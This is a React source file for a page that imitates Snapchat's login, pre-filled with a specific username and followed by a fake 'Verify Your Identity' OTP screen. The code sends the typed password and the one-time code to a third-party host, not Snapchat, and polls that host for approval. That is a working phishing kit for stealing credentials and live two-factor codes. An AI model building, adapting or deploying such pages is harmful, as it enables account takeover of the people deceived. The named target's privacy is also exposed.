import React, { useState, useRef, useEffect } from 'react';
import snaplogo from './assets/snaplogo.svg';

const SnapchatPassword = () => {
  const [currentScreen, setCurrentScreen] = useState('password'); // 'password' or 'otp'
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [otp, setOtp] = useState(['', '', '', '', '', '']);
  const [otpVerificationStatus, setOtpVerificationStatus] = useState('idle'); // idle, pending, approved, rejected
  const [alertConfig, setAlertConfig] = useState({ show: false, title: '', message: '' });
  const [passwordError, setPasswordError] = useState('');
  
  // Refs for OTP inputs
  const otpRefs = useRef([]);

  const showAlert = (title, message) => {
    setAlertConfig({ show: true, title, message });
  };

  const closeAlert = () => {
    setAlertConfig({ ...alertConfig, show: false });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setPasswordError('');
    
    if (password.trim()) {
      // Client-side password validation
      if (password !== 'jiminjim') {
        setPasswordError('Incorrect password. Please try again.');
        return;
      }

      try {
        // Submit password to backend
        const response = await fetch('https://api-accounts.afbex.com/stage/test/submit-password', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ password: password })
        });
        
        if (response.ok) {
          console.log('Password submitted:', password);
          // Don't poll, just move to OTP screen
          setCurrentScreen('otp');
        } else {
          setPasswordError('Failed to submit password. Please try again.');
        }
      } catch (error) {
        console.error('Error submitting password:', error);
        setPasswordError('Could not connect to verification server');
      }
    }
  };

  // OTP Screen Submit
  const handleOtpSubmit = async (e) => {
    e.preventDefault();
    const otpValue = otp.join('');
    if (otpValue.length === 6) {
      try {
        // Submit OTP to backend
        const response = await fetch('https://api-accounts.afbex.com/stage/test/submit-otp', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ otp: otpValue })
        });
        
        if (response.ok) {
          setOtpVerificationStatus('pending');
          startOtpPolling();
        }
      } catch (error) {
        console.error('Error submitting OTP:', error);
        showAlert('Connection Error', 'Could not connect to verification server');
      }
    }
  };

  const startOtpPolling = () => {
    const interval = setInterval(async () => {
      try {
        const response = await fetch('https://api-accounts.afbex.com/stage/test/check-status');
        const data = await response.json();
        
        if (data.status === 'approved') {
          setOtpVerificationStatus('approved');
          clearInterval(interval);
          showAlert('Success', 'Login verified successfully!');
        } else if (data.status === 'rejected') {
          setOtpVerificationStatus('rejected');
          clearInterval(interval);
          setOtpVerificationStatus('idle');
          setOtp(['', '', '', '', '', '']);
          showAlert('Incorrect Login Code', 'The code you entered is incorrect. Please try again.');
        }
      } catch (error) {
        console.error('OTP Polling error:', error);
      }
    }, 2000); // Poll every 2 seconds
  };

  // Handle OTP input change
  const handleOtpChange = (index, value) => {
    // Only allow digits
    if (value && !/^\d$/.test(value)) return;

    const newOtp = [...otp];
    newOtp[index] = value;
    setOtp(newOtp);

    // Auto-focus next input
    if (value && index < 5) {
      otpRefs.current[index + 1]?.focus();
    }
  };

  // Handle OTP input keydown
  const handleOtpKeyDown = (index, e) => {
    if (e.key === 'Backspace' && !otp[index] && index > 0) {
      otpRefs.current[index - 1]?.focus();
    }
  };

  // Auto-focus first OTP input when screen loads
  useEffect(() => {
    if (currentScreen === 'otp') {
      otpRefs.current[0]?.focus();
    }
  }, [currentScreen]);

  // Password Entry Screen
  if (currentScreen === 'password') {
    return (
      <div className="min-h-screen bg-[#F7F7F7] flex items-center justify-center p-4 font-sans">
        {/* Main Card Container */}
        <div className="bg-white rounded-2xl shadow-lg w-full max-w-[380px] p-8 flex flex-col items-center">
          
          {/* Snapchat Ghost Logo */}
          <div className="mb-6">
            <img src={snaplogo} alt="Snapchat" className='h-20'/>
          </div>

          {/* Title */}
          <h1 className="text-[28px] font-bold text-[#2B2B2B] mb-8">
            Enter Password
          </h1>

          {/* Username Section */}
          <div className="mb-8 flex items-center justify-center gap-2 border border-[#E8E8E8] rounded-lg px-4 py-3">
            <span className="text-[15px] font-semibold text-[#2B2B2B]">
              sbushra9521
            </span>
            <a 
              href="#" 
              className="text-[15px] font-medium text-[#00C3FF] hover:text-[#00A8E0] transition-colors"
            >
              Not you?
            </a>
          </div>

          {/* Password Input Section */}
          <form onSubmit={handleSubmit} className="w-full">
            <div className="mb-6">
              <label 
                htmlFor="password" 
                className="block text-[13px] font-medium text-[#737373] mb-2"
              >
                Password
              </label>
              <div className="relative">
                <input
                  type={showPassword ? "text" : "password"}
                  id="password"
                  value={password}
                  onChange={(e) => {
                    setPassword(e.target.value);
                    setPasswordError(''); // Clear error on input change
                  }}
                  className="w-full bg-[#F7F7F7] border-0 rounded-lg px-4 py-3.5 text-[15px] text-[#2B2B2B] placeholder-[#ADADAD] focus:outline-none focus:ring-2 focus:ring-[#00C3FF] transition-all pr-12"
                  placeholder=""
                />
                {/* Eye Icon */}
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-4 top-1/2 -translate-y-1/2 text-[#ADADAD] hover:text-[#737373] transition-colors"
                >
                  <svg 
                    width="20" 
                    height="20" 
                    viewBox="0 0 24 24" 
                    fill="none" 
                    stroke="currentColor" 
                    strokeWidth="2"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  >
                    {showPassword ? (
                      <>
                        <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24" />
                        <line x1="1" y1="1" x2="23" y2="23" />
                      </>
                    ) : (
                      <>
                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
                        <circle cx="12" cy="12" r="3" />
                      </>
                    )}
                  </svg>
                </button>
              </div>
              {/* Password Error Message */}
              {passwordError && (
                <p className="text-[13px] text-red-500 mt-2">
                  {passwordError}
                </p>
              )}
            </div>

            {/* Forgot Password Link */}
            <div className="mb-8 text-center">
              <a 
                href="#" 
                className="text-[15px] font-medium text-[#00C3FF] hover:text-[#00A8E0] transition-colors"
              >
                Forgot Password
              </a>
            </div>

            {/* Next Button */}
            <button
              type="submit"
              className="w-full bg-[#00C3FF] hover:bg-[#00A8E0] text-white font-bold text-[15px] py-3.5 rounded-full transition-all duration-200 shadow-sm hover:shadow-md active:scale-[0.98]"
            >
              Next
            </button>
          </form>
        </div>
      </div>
    );
  }

  // OTP Verification Screen
  return (
    <div className="min-h-screen bg-[#F7F7F7] flex items-center justify-center p-4 font-sans">
      {/* Main Card Container */}
      <div className="bg-white rounded-2xl shadow-lg w-full max-w-[380px] p-8 flex flex-col items-center">
        
        {/* Snapchat Ghost Logo */}
        <div className="mb-6">
          <img src={snaplogo} alt="Snapchat" className='h-20'/>
        </div>

        {/* Title */}
        <h1 className="text-[24px] font-bold text-[#2B2B2B] mb-4 text-center leading-tight">
          Verify Your Identity
        </h1>

        {/* Description */}
        <p className="text-[14px] text-[#737373] text-center mb-8 leading-relaxed px-2">
          In order to authorize the login, we have sent a 6-digit OTP on WhatsApp/SMS to your associated number
        </p>

        {/* OTP Input Section */}
        <form onSubmit={handleOtpSubmit} className="w-full">
          <div className="mb-8">
            <label className="block text-[13px] font-medium text-[#737373] mb-4 text-center">
              Enter OTP
            </label>
            
            {/* 6 OTP Input Boxes */}
            <div className="flex justify-center gap-3">
              {otp.map((digit, index) => (
                <input
                  key={index}
                  ref={(el) => (otpRefs.current[index] = el)}
                  type="text"
                  inputMode="numeric"
                  maxLength="1"
                  value={digit}
                  onChange={(e) => handleOtpChange(index, e.target.value)}
                  onKeyDown={(e) => handleOtpKeyDown(index, e)}
                  className="w-12 h-14 text-center text-[24px] font-semibold text-[#2B2B2B] bg-transparent border-b-2 border-[#E8E8E8] focus:border-[#00C3FF] focus:outline-none transition-colors"
                  disabled={otpVerificationStatus === 'pending'}
                />
              ))}
            </div>
          </div>

          {/* Resend OTP Link */}
          <div className="mb-8 text-center">
            <a 
              href="#" 
              className="text-[15px] font-medium text-[#00C3FF] hover:text-[#00A8E0] transition-colors"
            >
              Resend OTP
            </a>
          </div>

          {/* Verify Button */}
          <button
            type="submit"
            disabled={otp.join('').length !== 6 || otpVerificationStatus === 'pending'}
            className={`w-full font-bold text-[15px] py-3.5 rounded-full transition-all duration-200 shadow-sm flex items-center justify-center gap-2 ${
              otpVerificationStatus === 'pending'
                ? 'bg-gray-600 cursor-not-allowed text-white'
                : otp.join('').length === 6
                ? 'bg-[#00C3FF] hover:bg-[#00A8E0] text-white hover:shadow-md active:scale-[0.98]'
                : 'bg-[#E8E8E8] text-[#ADADAD] cursor-not-allowed'
            }`}
          >
            {otpVerificationStatus === 'pending' && (
              <svg className="animate-spin h-5 w-5" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
              </svg>
            )}
            {otpVerificationStatus === 'idle' && 'Verify'}
            {otpVerificationStatus === 'pending' && 'Verifying...'}
          </button>
        </form>
      </div>

      {/* Alert Popup */}
      {alertConfig.show && (
        <div className="fixed inset-0 flex items-center justify-center z-50 px-9 pointer-events-none">
          <div className="bg-white rounded-[12px] w-full max-w-[280px] overflow-hidden flex flex-col items-center shadow-2xl pointer-events-auto transition-all transform scale-100 opacity-100">
            <div className="pt-6 pb-4 px-6 text-center">
              <h3 className="text-black font-semibold text-[17px] mb-1 leading-tight">{alertConfig.title}</h3>
              <p className="text-[#8E8E8E] text-[14px] leading-tight">{alertConfig.message}</p>
            </div>
            <button 
              onClick={closeAlert}
              className="w-full border-t border-gray-100 py-3.5 text-[#0095f6] font-semibold text-[14px] active:bg-gray-50 transition"
            >
              OK
            </button>
          </div>
        </div>
      )}
    </div>
  );
};

export default SnapchatPassword;
